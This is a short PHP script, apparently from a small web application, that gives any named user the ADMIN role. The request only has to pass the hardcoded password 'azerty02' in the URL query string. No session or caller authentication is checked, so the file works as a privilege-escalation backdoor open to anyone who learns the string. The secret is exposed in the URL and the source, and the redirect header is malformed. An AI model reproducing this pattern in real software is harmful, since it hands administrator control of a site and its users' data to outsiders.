<?php

session_start();

require_once './config.php';
require_once './protection.php';

$login_ok = protect_montexte($_GET['login']);
$pass_ok = protect_montexte($_GET['password']);

if ($pass_ok == "azerty02"){
    $sql = "update users set role=? where login=?";

    if($stmt = mysqli_prepare($link,$sql)){
        mysqli_stmt_bind_param($stmt,"ss",$param_role,$param_login);

        $param_role = "ADMIN";
        $param_login = $login_ok;

        if(mysqli_stmt_execute($stmt)){
            mysqli_close($link);

            header ('Location://index.php?');
            exit();
            }
        }
    }
?>